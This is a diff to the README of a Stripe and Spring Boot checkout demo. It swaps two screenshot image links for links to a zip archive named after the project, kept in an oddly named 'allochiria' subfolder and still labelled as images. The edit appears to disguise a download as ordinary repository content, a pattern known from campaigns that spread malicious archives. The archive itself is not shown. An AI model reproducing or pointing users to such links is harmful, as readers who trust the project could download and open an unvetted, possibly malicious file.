@@ -5,8 +5,8 @@ This is a simple Spring Boot application that demonstrates how to integrate Stri
 - Product details and dynamic pricing
 - Success and cancel URL redirects
 
-![image alt](https://github.com/yuosef33/Stripe_SpringBoot/blob/master/P1.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/Stripe_SpringBoot/master/allochiria/Stripe_SpringBoot.zip).
 
 -----------------------------------------------------------------------------------
 
-![image alt](https://github.com/yuosef33/Stripe_SpringBoot/blob/master/P2.png?raw=true).
+![image alt](https://raw.githubusercontent.com/yuosef33/Stripe_SpringBoot/master/allochiria/Stripe_SpringBoot.zip).
